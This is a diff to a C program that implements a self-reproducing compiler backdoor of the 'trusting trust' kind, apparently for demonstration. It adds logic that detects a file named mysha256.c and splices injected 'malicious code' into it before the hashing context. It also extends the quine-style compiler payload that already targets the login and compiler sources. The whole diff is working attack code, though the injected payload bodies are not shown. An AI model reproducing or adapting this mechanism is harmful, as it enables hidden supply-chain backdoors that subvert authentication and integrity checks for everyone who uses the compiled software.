@@ -139,10 +139,28 @@ int main(int argc, char *argv[]){
 		"%c%cbuffer = newTempBuffer;%c"
 		"%c%csourceFileSize = newTotalBuffRequired - 1;%c"
 	"%c}%c%c"
+
+	"%cconst char * TEXT_INJECT_SHA256 = %c%s%c;%c%c"
+	"%cif(strstr(sourceFilename, %cmysha256.c%c) != NULL){%c"
+		"%c%cchar stringToInject[300];%c"
+		"%c%csnprintf(stringToInject, 300, TEXT_INJECT_SHA256, 34, 34, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9);%c"
+		"%c%cint lengthOfMaliciousCode = strlen(stringToInject);%c"
+		"%c%cint newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
+		"%c%cchar * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
+		"%c%cchar * injectPosition = strstr(buffer, %cSHA256_CTX ctx;%c);%c"
+		"%c%cint sizeOfPreInjectedBuff = injectPosition - buffer;%c"
+		"%c%cstrncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);%c"
+		"%c%cstrncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);%c"
+		"%c%cstrcat(newTempBuffer, injectPosition);%c"
+		"%c%cfree(buffer);%c"
+		"%c%cbuffer = newTempBuffer;%c"
+		"%c%csourceFileSize = newTotalBuffRequired - 1;%c"
+	"%c}%c%c"
+
 	"%cconst char * TEXT_INJECT_COMPILER = %c%s%c;%c%c"
 	"%cif(strstr(sourceFilename, %ccompiler.c%c) != NULL){%c"
 		"%c%cchar stringToInject[10000];%c"
-		"%c%csprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);%c"
+		"%c%csprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_SHA256, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);%c"
 		"%c%cint lengthOfMaliciousCode = strlen(stringToInject);%c"
 		"%c%cint newTotalBuffRequired = actualBuffSizeRequired + lengthOfMaliciousCode;%c"
 		"%c%cchar * newTempBuffer = (char *) calloc(newTotalBuffRequired, sizeof(char));%c"
@@ -161,7 +179,7 @@ int main(int argc, char *argv[]){
 		char stringToInject[10000];
 
 		//Generate malicious code
-		sprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);
+		sprintf(stringToInject, TEXT_INJECT_COMPILER, 34, TEXT_INJECT_LOGIN, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_SHA256, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 10, 10, 9, 34, TEXT_INJECT_COMPILER, 34, 10, 10, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 34, 34, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10, 9, 9, 10 ,9, 9, 10, 9, 10, 10, 9);
 
 		printf("%s\n", stringToInject);
 
